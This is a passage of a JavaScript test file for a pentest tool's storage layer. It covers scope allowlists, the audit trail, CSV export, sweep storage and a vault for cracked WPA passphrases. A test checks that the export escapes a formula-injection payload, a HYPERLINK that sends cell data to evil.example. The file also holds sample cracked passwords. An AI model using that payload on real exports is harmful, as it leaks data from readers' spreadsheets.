  // An empty allowlist authorises nothing, so it is either a mistake or a
  // request for unrestricted mode written the wrong way. Neither should be
  // stored as a scope.
  await assert.rejects(() => createScope(scopeInput({ targets: [] })), /at least one target/);
  const [row] = await raw().select('SELECT count(*) n FROM engagement_scope');
  assert.equal(row.n, 0);
});

test('unrestricted mode cannot be stored without a typed acknowledgement', async () => {
  await assert.rejects(
    () => createScope(scopeInput({ mode: 'UNRESTRICTED', targets: [] })),
    /typed acknowledgement/
  );
});

test('unrestricted mode with an acknowledgement needs no targets', async () => {
  const id = await createScope(scopeInput({
    mode: 'UNRESTRICTED', unrestricted_ack: 'I CONFIRM', targets: [],
  }));
  const [row] = await raw().select('SELECT mode, unrestricted_ack FROM engagement_scope WHERE id = $1', [id]);
  assert.equal(row.mode, 'UNRESTRICTED');
  assert.equal(row.unrestricted_ack, 'I CONFIRM');
});

test('an unrecognised mode falls back to the allowlist, not to unrestricted', async () => {
  const id = await createScope(scopeInput({ mode: 'ANYTHING_GOES' }));
  const [row] = await raw().select('SELECT mode FROM engagement_scope WHERE id = $1', [id]);
  assert.equal(row.mode, 'ALLOWLIST', 'a value this code does not recognise must fail closed');
});

test('exactly one scope can be active at a time', async () => {
  const a = await createScope(scopeInput({ engagement_name: 'A' }));
  const b = await createScope(scopeInput({ engagement_name: 'B' }));
  await activateScope(a);
  await activateScope(b);
  const rows = await raw().select('SELECT id FROM engagement_scope WHERE is_active = 1');
  // Two active scopes would make "which authorization covered this command?"
  // unanswerable, which is the one question the audit trail exists to answer.
  assert.deepEqual(rows.map(r => r.id), [b]);
});

test('target values are trimmed so a stray space cannot silently miss', async () => {
  const id = await createScope(scopeInput({ targets: [{ kind: 'BSSID', value: '  AA:BB:CC:DD:EE:FF  ' }] }));
  const targets = await getScopeTargets(id);
  assert.equal(targets[0].value, 'AA:BB:CC:DD:EE:FF');
});

test('the schema refuses a target kind the engine cannot interpret', async () => {
  // A CHECK constraint, not application code, because a kind the engine does
  // not understand is a target that silently matches nothing.
  const id = await createScope(scopeInput());
  await assert.rejects(() => addTarget(id, { kind: 'HOSTNAME', value: 'srv1' }));
});

test('targets can be added and removed from a live scope', async () => {
  const id = await createScope(scopeInput());
  await addTarget(id, { kind: 'IP', value: '10.0.0.7', note: 'jump box' });
  let targets = await getScopeTargets(id);
  assert.equal(targets.length, 2);
  const ip = targets.find(t => t.kind === 'IP');
  assert.equal(ip.note, 'jump box');
  await removeTarget(ip.id);
  targets = await getScopeTargets(id);
  assert.deepEqual(targets.map(t => t.kind), ['CIDR']);
});

test('deleting a scope takes its targets with it', async () => {
  const id = await createScope(scopeInput());
  await deleteScope(id);
  const [row] = await raw().select('SELECT count(*) n FROM engagement_targets WHERE scope_id = $1', [id]);
  assert.equal(row.n, 0);
});

test('deleting a scope does not erase its audit trail', async () => {
  // An audit trail that can be removed by deleting the thing it audits is not
  // an audit trail. `audit_log.scope_id` deliberately has no foreign key, and
  // `engagement_name` is denormalised onto every row so the record stays
  // readable afterwards.
  const id = await createScope(scopeInput());
  await recordAuditEvent({
    scope_id: id, engagement_name: 'ACME Q3', command: 'start_strike',
    target: 'AA:BB:CC:DD:EE:FF', decision: 'BLOCKED', reason: 'out of scope',
  });
  await deleteScope(id);
  const rows = await getAuditLog();
  assert.equal(rows.length, 1);
  assert.equal(rows[0].engagement_name, 'ACME Q3');
  assert.equal(rows[0].decision, 'BLOCKED');
});

// ── The payload handed to the engine ────────────────────────────────────────

test('with no active scope the engine is sent a cleared payload', async () => {
  // Not "no payload": leaving a stale scope loaded in the engine is the failure
  // mode this exists to prevent. An empty allowlist denies everything.
  await createScope(scopeInput());
  const payload = await buildScopePayload('operator-now');
  assert.equal(payload.scope_id, null);
  assert.equal(payload.mode, 'ALLOWLIST');
  assert.deepEqual(payload.targets, []);
  assert.equal(payload.operator, 'operator-now');
});

test('the active scope is sent with its targets', async () => {
  const id = await createScope(scopeInput({
    targets: [{ kind: 'CIDR', value: '10.0.0.0/24' }, { kind: 'SSID', value: 'ACME-CORP' }],
  }));
  await activateScope(id);
  const payload = await buildScopePayload();
  assert.equal(payload.scope_id, id);
  assert.equal(payload.authorized_by, 'CISO');
  assert.deepEqual(
    payload.targets.map(t => `${t.kind}:${t.value}`).sort(),
    ['CIDR:10.0.0.0/24', 'SSID:ACME-CORP']
  );
});

test('the person at the keyboard is preferred over the recorded operator', async () => {
  const id = await createScope(scopeInput({ operator: 'recorded' }));
  await activateScope(id);
  assert.equal((await buildScopePayload('at-the-keyboard')).operator, 'at-the-keyboard');
  assert.equal((await buildScopePayload()).operator, 'recorded');
});

test('deactivating every scope returns the engine to denying everything', async () => {
  const id = await createScope(scopeInput());
  await activateScope(id);
  await deactivateAllScopes();
  assert.equal(await getActiveScope(), null);
  assert.deepEqual((await buildScopePayload()).targets, []);
});

// ── Audit trail ─────────────────────────────────────────────────────────────

test('an audit decision that is not BLOCKED is recorded as ALLOWED, never as blank', async () => {
  // The column is CHECK-constrained to the two values, so a malformed payload
  // would otherwise throw and the event would be lost — and a lost audit row is
  // worse than a coarse one.
  await recordAuditEvent({ command: 'start_scan', decision: 'BLOCKED' });
  await recordAuditEvent({ command: 'start_scan', decision: 'ALLOWED' });
  await recordAuditEvent({ command: 'start_scan' });
  await recordAuditEvent({ command: 'start_scan', decision: 'SOMETHING_ELSE' });
  const summary = await getAuditSummary();
  assert.deepEqual(summary, { allowed: 3, blocked: 1 });
});

test('an event with no command is recorded as unknown rather than dropped', async () => {
  await recordAuditEvent({ decision: 'ALLOWED' });
  const [row] = await getAuditLog();
  assert.equal(row.command, 'unknown');
});

test('the audit count reports the real total behind a truncated table', async () => {
  const id = await createScope(scopeInput());
  for (let i = 0; i < 5; i++) {
    await recordAuditEvent({ scope_id: id, command: 'start_vuln_scan', decision: 'ALLOWED' });
  }
  await recordAuditEvent({ scope_id: 999, command: 'start_strike', decision: 'BLOCKED' });
  assert.equal(await getAuditCount(), 6);
  assert.equal(await getAuditCount(id), 5);
});

test('an audit count for scope zero is not an audit count for everything', async () => {
  // `scopeId ? ... : ...` treated 0 as "no scope given", so a caller asking
  // about one engagement silently got the whole installation.
  await recordAuditEvent({ scope_id: 0, command: 'a', decision: 'ALLOWED' });
  await recordAuditEvent({ scope_id: 1, command: 'b', decision: 'ALLOWED' });
  assert.equal(await getAuditCount(0), 1);
  assert.equal(await getAuditCount(), 2);
});

test('a scope trail comes back oldest first, and only its own', async () => {
  await recordAuditEvent({ scope_id: 1, ts: '2026-09-29T10:00:00Z', command: 'second', decision: 'ALLOWED' });
  await recordAuditEvent({ scope_id: 1, ts: '2026-09-29T09:00:00Z', command: 'first', decision: 'ALLOWED' });
  await recordAuditEvent({ scope_id: 2, ts: '2026-09-29T09:30:00Z', command: 'other', decision: 'ALLOWED' });
  const rows = await getAuditLogForScope(1);
  assert.deepEqual(rows.map(r => r.command), ['first', 'second']);
});

test('the audit log comes back newest first for the operator view', async () => {
  await recordAuditEvent({ ts: '2026-09-29T09:00:00Z', command: 'older', decision: 'ALLOWED' });
  await recordAuditEvent({ ts: '2026-09-29T10:00:00Z', command: 'newer', decision: 'ALLOWED' });
  const rows = await getAuditLog();
  assert.deepEqual(rows.map(r => r.command), ['newer', 'older']);
});

// ── The audit CSV export ────────────────────────────────────────────────────

test('the audit export is not a delivery mechanism for a formula', async () => {
  /*
    `audit_log.target` holds SSIDs, and an SSID is chosen by whoever owns the
    access point — including the one being investigated. This export is the file
    handed to management.

    The local escaper doubled quotes and stopped there, which fixes a malformed
    file but not this: a spreadsheet strips the quotes and then evaluates what
    is inside.
  */
  await recordAuditEvent({
    command: 'start_strike',
    target: '=HYPERLINK("http://evil.example/?x="&A1,"Click me")',
    decision: 'BLOCKED',
    reason: '@SUM(1+1)',
    details: '+1+1',
  });
  const { csv, rows } = await exportAuditTrailCsv();
  assert.equal(rows, 1);
  assert.ok(!csv.includes('"=HYPERLINK'), csv);
  assert.ok(csv.includes('"\'=HYPERLINK'), csv);
  assert.ok(csv.includes('"\'@SUM(1+1)"'), csv);
  assert.ok(csv.includes('"\'+1+1"'), csv);
});

test('a genuine negative number in the export stays a number', async () => {
  // The same file legitimately carries RSSI and coordinates, so the guard must
  // not quote-prefix every minus sign.
  await recordAuditEvent({ command: 'scan', target: '-72', decision: 'ALLOWED' });
  const { csv } = await exportAuditTrailCsv();
  assert.ok(csv.includes('"-72"'), csv);
  assert.ok(!csv.includes('"\'-72"'), csv);
});

test('a quote inside an audit value does not shift the following columns', async () => {
  await recordAuditEvent({
    command: 'start_capture', target: 'Guest "Free" WiFi', decision: 'ALLOWED', operator: 'nat',
  });
  const { csv } = await exportAuditTrailCsv();
  const line = csv.trim().split('\r\n').at(-1);
  // RFC 4180: one field, internal quotes doubled.
  assert.ok(line.includes('"Guest ""Free"" WiFi"'), line);
  assert.equal(line.split('","').length, 11, `expected 11 fields, got: ${line}`);
});

test('the export carries a BOM and CRLF line endings throughout', async () => {
  await recordAuditEvent({ command: 'a', decision: 'ALLOWED' });
  await recordAuditEvent({ command: 'b', decision: 'ALLOWED' });
  const { csv } = await exportAuditTrailCsv();
  assert.equal(csv[0], '﻿', 'without the BOM Excel mangles non-ASCII operator names');
  // A file that mixes LF and CRLF is one some parsers read as a single row.
  const withoutBom = csv.slice(1);
  assert.ok(!/(?<!\r)\n/.test(withoutBom), 'a bare LF is present somewhere');
});

test('the export scoped to one engagement contains only that engagement', async () => {
  await recordAuditEvent({ scope_id: 1, command: 'mine', decision: 'ALLOWED' });
  await recordAuditEvent({ scope_id: 2, command: 'theirs', decision: 'ALLOWED' });
  const { csv, rows } = await exportAuditTrailCsv(1);
  assert.equal(rows, 1);
  assert.ok(csv.includes('"mine"'));
  assert.ok(!csv.includes('"theirs"'));
});

test('an empty trail exports a header rather than an empty file', async () => {
  const { csv, rows } = await exportAuditTrailCsv();
  assert.equal(rows, 0);
  assert.ok(csv.includes('Timestamp,Engagement,Command'));
});

test('the export pages through more rows than one page holds', async () => {
  // The page size is 1000 and the loop breaks on a short page; an off-by-one
  // there silently truncates the trail the report points the reader at.
  const statements = [];
  for (let i = 0; i < 1205; i++) {
    const secs = String(i % 60).padStart(2, '0');
    statements.push(`INSERT INTO audit_log (ts, command, decision) VALUES ('2026-09-29T10:00:${secs}Z', 'cmd${i}', 'ALLOWED')`);
  }
  raw().raw.exec(statements.join(';\n'));
  const { csv, rows } = await exportAuditTrailCsv();
  assert.equal(rows, 1205);
  assert.equal(csv.trim().split('\r\n').length, 1206, 'header plus every row');
});

// ── Intrusion sweeps ────────────────────────────────────────────────────────

const host = (over = {}) => ({
  ip: '10.0.0.5',
  hostname: 'srv1',
  os: 'Windows Server 2019',
  mac: 'AA:BB:CC:DD:EE:01',
  vendor: 'Dell',
  isGateway: false,
  open_ports: [{ port: 445, service: 'SMB', banner: 'Windows' }],
  ...over,
});

test('every database module reads the same database', async () => {
  // `intrusionDB` and `benchmarkDB` each opened their own connection with the
  // database name written out as a literal. A `DB_NAME` change would have left
  // them reading a different file, and the symptom would have been history that
  // had simply vanished — so this pins that a row written through one module is
  // visible through another.
  await createSession('s-shared', '10.0.0.0/24', 'NORMAL');
  const [row] = await raw().select('SELECT id FROM scan_sessions WHERE id = $1', ['s-shared']);
  assert.equal(row.id, 's-shared');
  const sessions = await getSessions();
  assert.equal(sessions.length, 1);
});

test('a sweep records whether it came from the simulator', async () => {
  await createSession('s-real', '10.0.0.0/24', 'NORMAL', false);
  await createSession('s-sim', '10.0.0.0/24', 'NORMAL', true);
  const rows = await raw().select('SELECT id, is_simulated FROM scan_sessions ORDER BY id');
  // This was the one provenance flag in migration 008 with no writer, so every
  // sweep recorded as field data.
  assert.deepEqual(rows.map(r => [r.id, r.is_simulated]), [['s-real', 0], ['s-sim', 1]]);
});

test('a host and its ports are stored together', async () => {
  await createSession('s1', '10.0.0.0/24', 'DEEP');
  const id = await saveHost('s1', host({
    open_ports: [
      { port: 445, service: 'SMB' },
      { port: 3389, service: 'RDP', banner: 'Terminal Services' },
    ],
  }));
  assert.ok(id > 0, 'the host id is what the ports hang off');
  const hosts = await getSessionHosts('s1');
  assert.equal(hosts.length, 1);
  assert.deepEqual(hosts[0].ports.map(p => p.port).sort((a, b) => a - b), [445, 3389]);
  assert.equal(hosts[0].ports.find(p => p.port === 445).banner, null);
});

test('the superseded risk columns are unwritten, and risk_score reads as a confident zero', async () => {
  /*
    migration 009 declares risk_score / risk_level / last_status on
    intrusion_hosts. They are deliberately unwritten: `findings` holds the
    assessment, and a second risk number for the same host is exactly the
    problem the single rule set was written to end.

    Recorded here because "unwritten" does not look the same in all three.
    `risk_score` is `INTEGER NOT NULL DEFAULT 0`, so it comes back as 0 — the
    same shape as `wps_enabled NOT NULL DEFAULT 0`, which gave every access
    point a "no WPS" nobody had measured. Nothing reads this column today; if
    something starts to, this test is where it will learn that the 0 is a
    column default and not an assessment.
  */
  await createSession('s1', '10.0.0.0/24', 'NORMAL');
  await saveHost('s1', host());
  const [row] = await raw().select('SELECT risk_score, risk_level, last_status FROM intrusion_hosts');
  assert.equal(row.risk_score, 0, 'a default, not a measurement');
  assert.equal(row.risk_level, null);
  assert.equal(row.last_status, null);
});

test('a completed sweep records its host count and completion time', async () => {
  await createSession('s1', '10.0.0.0/24', 'NORMAL');
  await completeSession('s1', 6);
  const [row] = await raw().select('SELECT host_count, completed_at FROM scan_sessions WHERE id = $1', ['s1']);
  assert.equal(row.host_count, 6);
  assert.ok(row.completed_at);
});

test('a sweep that found nothing records zero, not an absent count', async () => {
  // Zero hosts on a subnet is a real result and the most reassuring one a
  // report can carry. It must not be stored the same way as "not recorded".
  await createSession('s1', '10.0.0.0/24', 'NORMAL');
  await completeSession('s1', 0);
  const [row] = await raw().select('SELECT host_count FROM scan_sessions WHERE id = $1', ['s1']);
  assert.equal(row.host_count, 0);
});

test('a sweep that never completed has no completion time', async () => {
  await createSession('s1', '10.0.0.0/24', 'NORMAL');
  const [row] = await raw().select('SELECT completed_at FROM scan_sessions WHERE id = $1', ['s1']);
  assert.equal(row.completed_at, null, 'an abandoned sweep must not read as a finished one');
});

test('a sweep does not read back another sweep’s hosts', async () => {
  await createSession('a', '10.0.0.0/24', 'NORMAL');
  await createSession('b', '10.1.0.0/24', 'NORMAL');
  await saveHost('a', host({ ip: '10.0.0.5' }));
  await saveHost('b', host({ ip: '10.1.0.5', mac: 'AA:BB:CC:DD:EE:02' }));
  const hosts = await getSessionHosts('a');
  assert.deepEqual(hosts.map(h => h.ip), ['10.0.0.5']);
});

// ── Device history ──────────────────────────────────────────────────────────

test('a MAC is matched regardless of case and separator', async () => {
  // The ARP table and the scanner do not agree on either, so an exact match
  // would report a known device as new.
  await createSession('s1', '10.0.0.0/24', 'NORMAL');
  await saveHost('s1', host({ mac: 'aa-bb-cc-dd-ee-01' }));
  const history = await getDeviceHistory('AA:BB:CC:DD:EE:01');
  assert.equal(history.length, 1);
  assert.equal(history[0].ip, '10.0.0.5');
});

test('device history answers "has it moved?" with distinct addresses', async () => {
  await createSession('s1', '10.0.0.0/24', 'NORMAL');
  await createSession('s2', '10.0.0.0/24', 'NORMAL');
  await saveHost('s1', host({ ip: '10.0.0.5' }));
  await saveHost('s2', host({ ip: '10.0.0.9' }));
  await saveHost('s2', host({ ip: '10.0.0.9' }));
  const changes = await getDeviceAddressChanges('AA:BB:CC:DD:EE:01');
  const byIp = Object.fromEntries(changes.map(c => [c.ip, c.sightings]));
  assert.deepEqual(byIp, { '10.0.0.5': 1, '10.0.0.9': 2 });
});

test('a MAC nobody has seen has no history rather than an error', async () => {
  assert.deepEqual(await getDeviceHistory('FF:FF:FF:FF:FF:FF'), []);
  assert.deepEqual(await getDeviceAddressChanges('FF:FF:FF:FF:FF:FF'), []);
});

// ── Deleting a sweep ────────────────────────────────────────────────────────

test('deleting a sweep leaves nothing of it behind', async () => {
  await createSession('s1', '10.0.0.0/24', 'NORMAL');
  const hostId = await saveHost('s1', host());
  await upsertFindings([finding({ fingerprint: 'sweep-finding' })], { session_id: 's1' });
  await createBaseline('before', { session_id: 's1' });

  await deleteSession('s1');

  for (const [table, column] of [['intrusion_hosts', 'session_id'],
                                 ['findings', 'session_id'],
                                 ['assessment_baselines', 'session_id'],
                                 ['scan_sessions', 'id']]) {
    const [row] = await raw().select(`SELECT count(*) n FROM ${table} WHERE ${column} = $1`, ['s1']);
    assert.equal(row.n, 0, `${table} still holds rows for the deleted sweep`);
  }
  const [ports] = await raw().select('SELECT count(*) n FROM intrusion_ports WHERE host_id = $1', [hostId]);
  assert.equal(ports.n, 0);
});

test('deleting every sweep does not delete a wardriving mission’s findings', async () => {
  // `findings` is shared between the two modules. A finding with a mission_id
  // and no session belongs to a survey, and clearing the intrusion history must
  // not take it.
  const mission = await createMission('M');
  await createSession('s1', '10.0.0.0/24', 'NORMAL');
  await upsertFindings([finding({ fingerprint: 'from-survey', subject_type: 'AP' })], { mission_id: mission });
  await upsertFindings([finding({ fingerprint: 'from-sweep' })], { session_id: 's1' });

  await deleteAllSessions();

  const remaining = await getFindings({});
  assert.deepEqual(remaining.map(f => f.fingerprint), ['from-survey']);
});

// ── Archived reports ────────────────────────────────────────────────────────

const report = (over = {}) => ({
  id: 'INT-1',
  type: 'INTRUSION',
  targetName: '10.0.0.0/24',
  timestamp: 1759000000000,
  summary: { totalNodes: 6, criticalNodes: 1 },
  rawData: { subnet: '10.0.0.0/24', hosts: [] },
  ...over,
});

test('a report round-trips through storage', async () => {
  await saveReport(report());
  const [loaded] = await getAllReports();
  assert.equal(loaded.id, 'INT-1');
  assert.equal(loaded.targetName, '10.0.0.0/24');
  assert.deepEqual(loaded.rawData, { subnet: '10.0.0.0/24', hosts: [] });
  assert.equal(loaded.simulated, false);
  assert.equal(loaded.origin, 'LOCAL');
});

test('a zero in the summary survives storage', async () => {
  // `|| null` stored "we surveyed this area and found no vulnerable access
  // points" identically to "no count was recorded", erasing the single most
  // valuable number a remediation report can carry.
  await saveReport(report({
    id: 'WD-1', type: 'WARDRIVING',
    summary: { totalAPs: 0, vulnerableAPs: 0, totalNodes: 0, criticalNodes: 0 },
  }));
  const [row] = await raw().select(
    'SELECT total_aps, vulnerable_aps, total_nodes, critical_nodes FROM intel_reports WHERE id = $1', ['WD-1']);
  assert.deepEqual(row, { total_aps: 0, vulnerable_aps: 0, total_nodes: 0, critical_nodes: 0 });
});

test('a genuinely absent summary field is stored as absent', async () => {
  await saveReport(report({ id: 'INT-2', summary: { totalNodes: 3, criticalNodes: 0 } }));
  const [row] = await raw().select('SELECT total_aps, critical_nodes FROM intel_reports WHERE id = $1', ['INT-2']);
  assert.equal(row.total_aps, null);
  assert.equal(row.critical_nodes, 0, 'and a zero beside it is still a zero');
});

test('saving a report twice under one id throws instead of doing nothing', async () => {
  // An import that silently did nothing was indistinguishable from one that
  // worked.
  await saveReport(report());
  await assert.rejects(() => saveReport(report()));
});

test('an unreadable archive does not empty the whole list', async () => {
  /*
    `JSON.parse(r.raw_data)` was called inline while mapping every row, so one
    truncated blob — a half-written import, a row from a session that died
    mid-write — threw out of the function the Reports page uses to list
    everything. The archive list came back empty, with no indication that any
    reports existed or which one was at fault.
  */
  await saveReport(report({ id: 'GOOD-1' }));
  await saveReport(report({ id: 'BAD-1' }));
  raw().raw.exec(`UPDATE intel_reports SET raw_data = '{"hosts":[' WHERE id = 'BAD-1'`);

  const reports = await getAllReports();
  assert.equal(reports.length, 2, 'both rows must still be listed');
  const bad = reports.find(r => r.id === 'BAD-1');
  assert.equal(bad.rawData.unreadable, true);
  assert.match(bad.rawData.reason, /could not be parsed/);
  const good = reports.find(r => r.id === 'GOOD-1');
  assert.equal(good.rawData.unreadable, undefined);
});

test('stored data that parses to something other than an object is marked unreadable', async () => {
  // `JSON.parse('null')` and `JSON.parse('7')` both succeed, and everything
  // downstream reads properties off this value.
  await saveReport(report({ id: 'NULL-1' }));
  raw().raw.exec(`UPDATE intel_reports SET raw_data = 'null' WHERE id = 'NULL-1'`);
  const [loaded] = await getAllReports();
  assert.equal(loaded.rawData.unreadable, true);
});

test('an existence check does not need the archive to be readable', async () => {
  await saveReport(report());
  assert.equal(await reportExists('INT-1'), true);
  assert.equal(await reportExists('nope'), false);
});

test('an imported archive is marked so the cover cannot claim live hardware', async () => {
  await saveReport(report());
  await markImported('INT-1');
  const [loaded] = await getAllReports();
  assert.equal(loaded.origin, 'IMPORTED');
  const provenance = await getExportProvenance('INT-1');
  assert.equal(provenance.origin, 'IMPORTED');
});

test('export provenance records the rule set that produced the document', async () => {
  await saveReport(report());
  await recordExport('INT-1', {
    sha256: 'a'.repeat(64), filename: 'report.pdf', exported_by: 'operator-a',
    app_version: '0.1.0', engine_version: '0.9.3', cve_data_date: '2026-09-01',
    methodology: { id: 'lockon', version: 4 },
  });
  const p = await getExportProvenance('INT-1');
  assert.equal(p.sha256, 'a'.repeat(64));
  assert.equal(p.export_filename, 'report.pdf');
  assert.ok(p.exported_at, 'a digest with no time beside it cannot be checked against anything');
  // Stored as JSON so the severities in a signed document can be traced to the
  // rules that produced them.
  assert.deepEqual(JSON.parse(p.methodology), { id: 'lockon', version: 4 });
});

test('provenance for a report that was never exported is empty, not invented', async () => {
  await saveReport(report());
  const p = await getExportProvenance('INT-1');
  assert.equal(p.sha256, null);
  assert.equal(p.exported_at, null);
  assert.equal(p.origin, 'LOCAL');
});

test('provenance for a report that does not exist is null', async () => {
  assert.equal(await getExportProvenance('nope'), null);
});

test('reports come back newest first', async () => {
  await saveReport(report({ id: 'older', timestamp: 1 }));
  await saveReport(report({ id: 'newer', timestamp: 2 }));
  assert.deepEqual((await getAllReports()).map(r => r.id), ['newer', 'older']);
});

test('renaming and removing a report touch only that report', async () => {
  await saveReport(report({ id: 'a' }));
  await saveReport(report({ id: 'b' }));
  await updateReportName('a', 'RENAMED');
  await removeReport('b');
  const reports = await getAllReports();
  assert.deepEqual(reports.map(r => [r.id, r.targetName]), [['a', 'RENAMED']]);
});

test('clearing every report leaves the table empty', async () => {
  await saveReport(report({ id: 'a' }));
  await saveReport(report({ id: 'b' }));
  await clearAllReports();
  assert.deepEqual(await getAllReports(), []);
});

// ── Cracked WPA passphrases ─────────────────────────────────────────────────
//
// A recovered passphrase is a credential, and it belongs behind the same vault
// as everything in `credentials`. It was not: `cracked_password` was written in
// cleartext, shown in the Decryptor's history table, and untouched by sealing
// the vault — so the vault banner could read "no unprotected rows" while every
// cracked passphrase sat in the file. Migration 017 closes that.

/**
 * The vault, created once for this file.
 *
 * 600,000 PBKDF2 iterations is the point of the KDF, not an accident, so it is
 * paid once. `createVault` leaves it unlocked and the key lives in module state
 * for the rest of the run.
 */
let vaultReady = false;
async function ensureVault() {
  if (!vaultReady) {
    await createVault('a-long-engagement-passphrase');
    vaultReady = true;
  }
  if (!isUnlocked()) {
    // A test that locked it deliberately. Recreating is impossible by design,
    // so this file's lock test restores the key itself.
    throw new Error('the vault was left locked by an earlier test');
  }
}

const crackRun = (over = {}) => ({
  pcap_file: 'capture-01.pcap',
  ssid: 'CORP-WIFI',
  bssid: 'AA:BB:CC:DD:EE:01',
  encryption: '22000',
  wordlist: 'rockyou.txt',
  mangling_keywords: null,
  result: 'SUCCESS',
  cracked_password: 'Summer2026!',
  passwords_tested: 1_200_000,
  passwords_total: 14_344_391,
  duration_seconds: 630,
  ...over,
});

const PASSPHRASE_RE = /Summer2026!/;

test('a recovered passphrase is never written in cleartext', async () => {
  await ensureVault();
  await saveCrackingRecord(crackRun());
  const [row] = await raw().select('SELECT * FROM cracking_history');
  assert.equal(row.cracked_password, null, 'the cleartext column must stay empty');
  assert.ok(row.password_cipher, 'and the ciphertext must be there instead');
  assert.ok(row.password_iv);
  assert.equal(row.enc_version, 1);
  // The plaintext must not have leaked into any other column on the way past.
  assert.ok(!PASSPHRASE_RE.test(JSON.stringify(row)), JSON.stringify(row));
});

test('a passphrase round-trips through the vault', async () => {
  await ensureVault();
  await saveCrackingRecord(crackRun());
  const [record] = await getCrackingHistory();
  const revealed = await revealCrackedPassword(record);
  assert.equal(revealed.password, 'Summer2026!');
  assert.equal(revealed.reason, 'ok');
});

test('a run that cracked nothing is recordable with the vault locked', async () => {
  /*
    The negative result is the one this tool produces most often and it is a
    finding: "this wordlist was exhausted against this handshake and did not
    crack it". Refusing to record it because the vault happens to be locked
    would lose that, and there is no secret in it to protect.
  */
  await ensureVault();
  lockVault();
  try {
    await saveCrackingRecord(crackRun({ result: 'FAILED', cracked_password: null }));
  } finally {
    await openVault('a-long-engagement-passphrase');
  }
  const [record] = await getCrackingHistory();
  assert.equal(record.result, 'FAILED');
  assert.equal(record.enc_version, 1, 'nothing to protect is not the same as unprotected');
  const revealed = await revealCrackedPassword(record);
  assert.equal(revealed.reason, 'none');
});

test('a recovered passphrase is refused rather than stored in the clear', async () => {
  // There is deliberately no cleartext fallback — storing it unprotected "just
  // this once" is the behaviour the vault exists to remove. The Decryptor page
  // turns this into a toast telling the operator the result is only in memory.
  await ensureVault();
  lockVault();
  try {
    await assert.rejects(() => saveCrackingRecord(crackRun()), VaultLockedError);
    const [row] = await raw().select('SELECT count(*) n FROM cracking_history');
    assert.equal(row.n, 0, 'and nothing half-written is left behind');
  } finally {
    await openVault('a-long-engagement-passphrase');
  }
});

test('a locked vault withholds the passphrase rather than reporting none', async () => {
  // "The run recovered nothing" and "the vault is locked" are opposite
  // statements about the same network. Collapsing them into an empty cell would
  // make a successful crack read as a failed one.
  await ensureVault();
  await saveCrackingRecord(crackRun());
  const [record] = await getCrackingHistory();
  lockVault();
  try {
    const revealed = await revealCrackedPassword(record);
    assert.equal(revealed.password, null);
    assert.equal(revealed.reason, 'locked');
  } finally {
    await openVault('a-long-engagement-passphrase');
  }
});

test('ciphertext that does not authenticate is reported, not rendered as blank', async () => {
  await ensureVault();
  await saveCrackingRecord(crackRun());
  raw().raw.exec("UPDATE cracking_history SET password_cipher = 'not-real-ciphertext'");
  const [record] = await getCrackingHistory();
  const revealed = await revealCrackedPassword(record);
  assert.equal(revealed.password, null);
  assert.equal(revealed.reason, 'undecryptable');
});

test('a row written before migration 017 still reads its cleartext', async () => {
  // Existing installs keep their data. The column stays for exactly this.
  await ensureVault();
  raw().raw.exec(`INSERT INTO cracking_history
    (pcap_file, wordlist, result, cracked_password, passwords_tested, passwords_total,
     duration_seconds, enc_version)
    VALUES ('legacy.pcap', 'rockyou.txt', 'SUCCESS', 'OldPassword1', 1, 2, 3, 0)`);
  const [record] = await getCrackingHistory();
  const revealed = await revealCrackedPassword(record);
  assert.equal(revealed.password, 'OldPassword1');
  assert.equal(revealed.reason, 'ok');
});

test('legacy cleartext rows are counted as unprotected', async () => {
  await ensureVault();
  raw().raw.exec(`INSERT INTO cracking_history
    (pcap_file, wordlist, result, cracked_password, passwords_tested, passwords_total,
     duration_seconds, enc_version)
    VALUES ('legacy.pcap', 'rockyou.txt', 'SUCCESS', 'OldPassword1', 1, 2, 3, 0)`);
  // A legacy run that cracked nothing has no secret and must not be counted.
  raw().raw.exec(`INSERT INTO cracking_history
    (pcap_file, wordlist, result, cracked_password, passwords_tested, passwords_total,
     duration_seconds, enc_version)
    VALUES ('legacy2.pcap', 'rockyou.txt', 'FAILED', NULL, 1, 2, 3, 0)`);
  assert.equal(await countUnprotectedCrackedPasswords(), 1);
});

test('sealing migrates a legacy passphrase and leaves nothing in the column', async () => {
  await ensureVault();
  raw().raw.exec(`INSERT INTO cracking_history
    (pcap_file, wordlist, result, cracked_password, passwords_tested, passwords_total,
     duration_seconds, enc_version)
    VALUES ('legacy.pcap', 'rockyou.txt', 'SUCCESS', 'OldPassword1', 1, 2, 3, 0)`);

  const sealed = await sealLegacyCrackingHistory();
  assert.equal(sealed, 1);
  const [row] = await raw().select('SELECT * FROM cracking_history');
  assert.equal(row.cracked_password, null);
  assert.equal(row.enc_version, 1);
  // And it is still readable through the vault — sealed, not lost.
  const [record] = await getCrackingHistory();
  assert.equal((await revealCrackedPassword(record)).password, 'OldPassword1');
  assert.equal(await countUnprotectedCrackedPasswords(), 0);
});

test('sealing is idempotent', async () => {
  await ensureVault();
  raw().raw.exec(`INSERT INTO cracking_history
    (pcap_file, wordlist, result, cracked_password, passwords_tested, passwords_total,
     duration_seconds, enc_version)
    VALUES ('legacy.pcap', 'rockyou.txt', 'SUCCESS', 'OldPassword1', 1, 2, 3, 0)`);
  assert.equal(await sealLegacyCrackingHistory(), 1);
  assert.equal(await sealLegacyCrackingHistory(), 0);
});

test('sealing with a locked vault is refused rather than marking rows sealed', async () => {
  // Marking a row sealed without writing a ciphertext turns a recovered
  // passphrase into "no password recorded" — losing the finding rather than
  // protecting it.
  await ensureVault();
  raw().raw.exec(`INSERT INTO cracking_history
    (pcap_file, wordlist, result, cracked_password, passwords_tested, passwords_total,
     duration_seconds, enc_version)
    VALUES ('legacy.pcap', 'rockyou.txt', 'SUCCESS', 'OldPassword1', 1, 2, 3, 0)`);
  lockVault();
  try {
    await assert.rejects(() => sealLegacyCrackingHistory(), VaultLockedError);
    const [row] = await raw().select('SELECT cracked_password, enc_version FROM cracking_history');
    assert.equal(row.cracked_password, 'OldPassword1');
    assert.equal(row.enc_version, 0);
  } finally {
    await openVault('a-long-engagement-passphrase');
  }
});

test('the vault status counts unprotected secrets in both tables', async () => {
  /*
    This is the claim that was false. `unprotected` counted `credentials` only,
    so an operator could seal the vault, watch the banner go green, and carry a
    laptop off the engagement with every cracked passphrase in cleartext.
  */
  await ensureVault();
  raw().raw.exec(`INSERT INTO credentials
    (target_ip, port, service, username, password, enc_version)
    VALUES ('10.0.0.5', 22, 'ssh', 'root', 'cleartext1', 0)`);
  raw().raw.exec(`INSERT INTO cracking_history
    (pcap_file, wordlist, result, cracked_password, passwords_tested, passwords_total,
